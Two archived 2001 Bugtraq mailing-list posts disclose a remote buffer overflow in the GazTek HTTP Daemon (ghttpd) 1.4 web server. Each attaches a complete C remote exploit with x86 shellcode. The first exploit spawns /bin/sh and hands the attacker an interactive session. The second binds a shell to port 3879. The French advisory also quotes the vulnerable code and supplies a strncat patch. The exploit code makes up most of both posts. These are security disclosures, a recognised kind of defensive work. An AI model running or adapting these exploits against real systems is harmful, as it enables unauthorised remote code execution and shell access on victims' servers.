=== Content from marc.info_963502d6_20250125_220634.html ===

```
[[prev in list](?l=bugtraq&m=99293083815512&w=2)] [[next in list](?l=bugtraq&m=99290389524639&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    Buffer Overflow in GazTek HTTP Daemon v1.4 (ghttpd)
From:       [qitest1 <qitest1 () cercaband ! com>](?a=99184700300001&r=1&w=2)
Date:       [2001-06-17 14:01:55](?l=bugtraq&r=1&w=2&b=200106)
[Download RAW [message](?l=bugtraq&m=99279182704674&q=mbox) or [body](?l=bugtraq&m=99279182704674&q=raw)]

/* qitest1's security advisory #002
   */

  Buffer Overflow in GazTek HTTP Daemon v1.4 (ghttpd)

+Systems Affected
  Any system running GazTek HTTP Daemon v1.4 (ghttpd)

+Program Description
  ghttpd is a small and easy to configure HTTP server with CGI support,
  tested on Linux. It can run as a standalone daemon or can be called
  by inetd. It has been written by Gareth Owen <gaz@athene.co.uk>,
  <http://members.xoom.com/gaztek>.

+Vulnerability And Impact
  A remote attacker can overflow a buffer and execute arbitrary code
  on the system with the privileges of the user running ghttpd, that
  is nobody, as all the privileges are dropped out.
  Infact in util.c at line 219 we have:
        va_start(ap, format);           // format it all into temp
        vsprintf(temp, format, ap);
        va_end(ap);

+Solution
  The author was contacted but he did not answered. Apply a patch to
  the source code of the daemon or remove it from your system.

+Exploit
  This bug can be succesfully exploited by a remote attacker. There is
  a demonstrative exploit code attached to this advisory. See the code
  for more info.

--
/* qitest1		<http://qitest1.cjb.net> *
 *    ``Ut tensio, sic vis. 69 tecum sis.''    *
 * main(){if(unsatisfied == 69) try_come(in);} */

[["ghttpd.c" (TEXT/PLAIN)]](?l=bugtraq&m=99279182704674&q=p3)

/*
 * GazTek HTTP Daemon v1.4 (ghttpd) Linux x86 remote exploit
 * by qitest1 - 17/06/2001
 *
 * Root privileges are dropped out by the daemon, so a shell owned by
 * nobody will be executed.
 *
 * 0x69.. =)
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>

#define RETPOS 		161

struct targ
{
   int                  def;
   char                 *descr;
   unsigned long int    retaddr;
};

struct targ target[]=
    {
      {0, "RedHat 6.2 with GazTek HTTP Daemon v1.4 (ghttpd) from tar.gz", 0xbfffba47},
      {69, NULL, 0}
    };

  /* Just the dear old Aleph1's shellcode. This is the only shellcode
   * that seemed to work with this vulnerability. All the other ones
   * made the daemon crashing too early and zapping out connection,
   * shell and all their friends.
   */
char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

char            mybuf[RETPOS + 4];

int             sockami(char *host, int port);
void		do_mybuf(unsigned long retaddr);
void		shellami(int sock);
void		usage(char *progname);

main(int argc, char **argv)
{
int     sel = 0,
        offset = 0,
        sock,
        cnt;
char    *host = NULL,
	sbuf[1024];

  printf("\n  GazTek HTTP Daemon v1.4 (ghttpd) exploit by qitest1\n\n");

  if(argc == 1)
        usage(argv[[0]](#0));
  while((cnt = getopt(argc,argv,"h:t:o:")) != EOF)
    {
   switch(cnt)
        {
   case 'h':
     host = strdup(optarg);
     break;
   case 't':
     sel = atoi(optarg);
     break;
   case 'o':
     offset = atoi(optarg);
     break;
   default:
     usage(argv[[0]](#0));
     break;
        }
    }
  if(host == NULL)
        usage(argv[[0]](#0));

  printf("+Host: %s\n  as: %s\n", host, target[sel].descr);
  printf("+Connecting to %s...\n", host);
  sock = sockami(host, 80);
  printf("  connected\n");

  target[sel].retaddr += offset;
  printf("+Building buffer with retaddr: %p...\n", target[sel].retaddr);
  do_mybuf(target[sel].retaddr);
  printf("  done\n");

  sprintf(sbuf, "GET /%s\n\n", mybuf);
  send(sock, sbuf, strlen(sbuf), 0);
  printf("+Overflowing...\n");

  printf("+Zzing...\n");
  sleep(2);
  printf("+Getting shell...\n");
  shellami(sock);
}

int
sockami(char *host, int port)
{
struct sockaddr_in address;
struct hostent *hp;
int sock;

  sock = socket(AF_INET, SOCK_STREAM, 0);
  if(sock == -1)
        {
          perror("socket()");
          exit(-1);
        }

  hp = gethostbyname(host);
  if(hp == NULL)
        {
          perror("gethostbyname()");
          exit(-1);
        }

  memset(&address, 0, sizeof(address));
  memcpy((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons(port);

  if(connect(sock, (struct sockaddr *) &address, sizeof(address)) == -1)
        {
          perror("connect()");
          exit(-1);
        }

  return(sock);
}

void
do_mybuf(unsigned long retaddr)
{
int		i,
		n = 0;
unsigned long 	*ret;

  memset(mybuf, 0x90, sizeof(mybuf));
  for(i = RETPOS - strlen(shellcode); i < RETPOS; i++)
	mybuf[i] = shellcode[n++];
  ret = (unsigned long *)(mybuf + RETPOS);
  *ret = retaddr;
  mybuf[RETPOS + 4] = '\x00';
}

void
shellami(int sock)
{
int             n;
char            recvbuf[1024];
char            *cmd = "id; uname -a\n";
fd_set          rset;

  send(sock, cmd, strlen(cmd), 0);

  while (1)
    {
      FD_ZERO(&rset);
      FD_SET(sock,&rset);
      FD_SET(STDIN_FILENO,&rset);
      select(sock+1,&rset,NULL,NULL,NULL);
      if (FD_ISSET(sock,&rset))
        {
          n=read(sock,recvbuf,1024);
          if (n <= 0)
            {
              printf("Connection closed by foreign host.\n");
              exit(0);
            }
          recvbuf[n]=0;
          printf("%s",recvbuf);
        }
      if (FD_ISSET(STDIN_FILENO,&rset))
        {
          n=read(STDIN_FILENO,recvbuf,1024);
          if (n>0)
            {
              recvbuf[n]=0;
              write(sock,recvbuf,n);
            }
        }
    }
  return;
}

void
usage(char *progname)
{
int             i = 0;

  printf("Usage: %s [options]\n", progname);
  printf("Options:\n"
         "  -h hostname\n"
         "  -t target\n"
         "  -o offset\n"
         "Available targets:\n");
  while(target[i].def != 69)
        {
          printf("  %d) %s\n", target[i].def, target[i].descr);
          i++;
        }

  exit(1);
}

[[prev in list](?l=bugtraq&m=99293083815512&w=2)] [[next in list](?l=bugtraq&m=99290389524639&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from marc.info_9cd561cb_20250125_220634.html ===

```
[[prev in list](?l=bugtraq&m=99406096610522&w=2)] [[next in list](?l=bugtraq&m=99406360517216&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    Advisory Ghttp 1.4
From:       [renar renar <renar () tiscalinet ! fr>](?a=99406272900001&r=1&w=2)
Date:       [2001-06-30 17:43:26](?l=bugtraq&r=1&w=2&b=200106)
[Download RAW [message](?l=bugtraq&m=99406263214417&q=mbox) or [body](?l=bugtraq&m=99406263214417&q=raw)]

/*--------------------------------------------*/
/*     - Advisory "Ghttpd 1.4" -              */
/*--------------------------------------------*/
/* Auteurs   : Lionel & Gangstuck             */
/* Contact   : cronos56@yahoo.com             */
/*             webmaster@clickmicro.com       */
/* WEB       : [www.secu-fr.org](http://www.secu-fr.org)                */
/*             [www.clickmicro.com](http://www.clickmicro.com)             */
/* IRC       : #:secu-fr #clickmicro          */
/*--------------------------------------------*/
/* Party 2001 clickmicro & secu-fr 30/06/2001 */
/*--------------------------------------------*/

Adivosry Ghttpd 1.4 ([www.GazTek.org](http://www.GazTek.org)) :
====================================

  Buffer overflow en remote sur les commandes
    -> GET /'Ax157'
    -> GET /cgi-bin/'Ax149'(environ).

Code vulnerable :
===============

/* protocol.c */
int serveconnection(int sockfd)
{
char filename[255];
...
Log("Connection from %s, request = \"GET %s\"",
inet_ntoa(sa.sin_addr), ptr);

        if(!strncmp(ptr, thehost->CGIBINDIR,
strlen(thehost->CGIBINDIR)))
        {/* Trying to execute a cgi-bin file ?
lets check */
                ptr2 = strstr(ptr, "?");
                if(ptr2!=NULL) { ptr2[[0]](#0) = '\0';
flag = 1; }

                strcpy(filename,
thehost->CGIBINROOT);
                ptr += strlen(thehost->CGIBINDIR);
                strcat(filename, ptr);

                // Filename = program to execute
                // ptr = filename in cgi-bin dir
                // ptr2+1 = parameters
...
        strcpy(filename, thehost->DOCUMENTROOT);
        strcat(filename, ptr);
...

/* ou */
PTR == Entrée socket
CGIBINROOT == /usr/local/ghttpd/cgi-bin
DOCUMENTROOT == /usr/local/ghttpd/htdocs

Faille :
======

Le but est d'overflowder char filename[255]
par ptr qui est le contenu de la demande URL.
Nous avons procédé à un teste simple qui consiste
à envoyer 157 A consecutifs dans la demande URL..
ceci à provoqué un overflow du daemon retournant
alors comme adresse ret 41414141....

Code Exploit (proof of concept) :
===============================

/*--------------------------------------------*/
/* Ghttpd 1.4 remote exploit                  */
/*--------------------------------------------*/
/* Auteurs   : Lionel & Gangstuck             */
/* Contact   : cronos56@yahoo.com             */
/*             webmaster@clickmicro.com       */
/* WEB       : [www.secu-fr.org](http://www.secu-fr.org)                */
/*             [www.clickmicro.com](http://www.clickmicro.com)             */
/* IRC       : #:secu-fr #clickmicro          */
/*--------------------------------------------*/
/* Party 2001 Lionel & Gangstuck - 30/06/2001 */
/*--------------------------------------------*/
/* GET /[NOPS] [shellcode] [ret] [ret]        */
/* ret sur SuSe 7.0 : 0xbfffb504 == OK        */
/*                    0xbfffb515 == LTRACE    */
/*--------------------------------------------*/
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#define TAILLE 157 // taille du buffer à
overflowder
struct in_addr victim;
char overflow[4096];
char shellcode[] = // bind a shell to port 3879

"\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"
"\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"
"\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0"
"\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"
"\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"
"\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75"
"\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"
"\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh";

/* mise en place de l'overflow */
int overflowed(char *ret){
    int i;
    memset(overflow, 0, sizeof(overflow));
    strcpy(overflow,"GET /");
    for(i=0;i<(TAILLE-(strlen(shellcode))); i++){
      strcat(overflow,"\x90");
    }
    strcat(overflow, shellcode);
    strcat(overflow, ret);
    strcat(overflow, ret);
}

int envoie(struct in_addr addr,char *cport)
{
struct sockaddr_in serv;
int s;
int port=atoi(cport);

s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
bzero(&serv,sizeof(serv));
memcpy(&serv.sin_addr,&addr,sizeof(struct
in_addr));
serv.sin_port=htons(port);
serv.sin_family=AF_INET;
if (connect(s,(struct sockaddr
*)&serv,sizeof(serv)) < 0){
  perror("connect");
  exit(0);
}
 write(s,overflow,strlen(overflow));
 write(s,"\n\n",2);
 close(s);
}

int host_to_ip(char *hostname,struct in_addr
*addr)
{
struct hostent *res;

res=gethostbyname(hostname);
if (res==NULL)
  return(0);
memcpy((char *)addr,res->h_addr,res->h_length);
return(1);
}

int main(int argc, char **argv){
    char ret[[8]](#8), serveur[256], port[[8]](#8);
    printf("Exploit ghttpd_1.4 by Lionel and
GangstucK\n\n");
    if(argc<2) {
       printf("Usage : %s <serveur IP> [port]\n",
argv[[0]](#0));
       exit(0);
    }
    if(argc==3){
       strncpy(port, argv[[2]](#2), 7);
    }
    else{
       strcpy(port, "80\0");
    }
    strcpy(ret, "\x04\xb5\xff\xbf"); // ret pour
suse 7.0
    strncpy(serveur, argv[[1]](#1), sizeof(serveur)-1);
    overflowed(ret);
    if (!host_to_ip(serveur,&victim))
    {
       fprintf(stderr,"Hostname lookup
failure\n");
       exit(0);
    }
    envoie(victim,port);
    printf("Remote shell listening to port
3879\n");
    exit(0);
}

Patch :
=====

/* patch.diff */

44a45
>       int tno;
106,107c107,108
<               strcat(filename, ptr);
<
---
>               tno = strlen(filename);
>               strncat(filename, ptr,
sizeof(filename)-tno);
143,144c144,145
<       strcat(filename, ptr);
<
---
>       tno = strlen(filename);
>       strncat(filename, ptr,
sizeof(filename)-tno);

Pour appliquer le patch, faites :

   $ patch protocol.c patch.diff

Remerciements :
=============
   - Tzero / Subculture / Frstylez / Secu-fr /
Clickmicro / Phreakon
   - #secu-fr #clickmicro #tzero #shellscript
   - Descript, Renar, RoX, Martony, Wp92, Vanille,
ad, sebsb, manak,
     CrazyLord, Kryl, medgi, Spud, Klemm, Psirac,
OUAH, ohm, Saperus,
     tout ceux qui nous soutiennent/aident et que
nous oublions ici,
     à toutes les taspé, les freestylers et les
djeunz de l'univers...
     et une speciale à l'3l33t m00nc0wb0y (tu sux
man) ...

[[prev in list](?l=bugtraq&m=99406096610522&w=2)] [[next in list](?l=bugtraq&m=99406360517216&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


